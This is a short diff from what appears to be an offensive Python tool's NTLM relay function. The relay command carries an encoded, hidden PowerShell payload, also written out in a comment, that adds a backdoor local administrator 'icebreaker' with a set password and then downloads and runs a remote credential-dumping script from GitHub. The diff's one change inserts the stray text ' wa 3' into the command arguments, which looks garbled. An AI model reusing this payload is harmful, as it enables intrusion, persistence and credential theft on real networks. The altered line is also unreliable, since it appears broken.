@@ -731,7 +731,7 @@ def run_relay_attack(domains):
 
 # net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/DanMcInerney/Obf-Cats/master/Obf-Cats.ps1'); Obf-Cats -pwds
     relay_cmd = ('python2 submodules/impacket/examples/ntlmrelayx.py -6 -wh Proxy-Service'
-                ' -of hashes/ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt'
+                ' -of hashes/ntlmrelay-hashes -tf smb-signing-disabled-hosts.txt wa 3'
                 ' -c "powershell -nop -exec bypass -w hidden -enc '
                 'bgBlAHQAIAB1AHMAZQByACAALwBhAGQAZAAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIABQAEAAcwBzAHcAbwByAGQAMQAyADMANAA1ADYAOwAgAG4AZQB0ACAAbABvAGMAYQBsAGcAcgBvAHUAcAAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwAgAGkAYwBlAGIAcgBlAGEAawBlAHIAIAAvAGEAZABkADsAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBEAGEAbgBNAGMASQBuAGUAcgBuAGUAeQAvAE8AYgBmAC0AQwBhAHQAcwAvAG0AYQBzAHQAZQByAC8ATwBiAGYALQBDAGEAdABzAC4AcABzADEAJwApADsAIABPAGIAZgAtAEMAYQB0AHMAIAAtAHAAdwBkAHMADQAKAA==')
     ntlmrelay_proc = run_proc(relay_cmd)
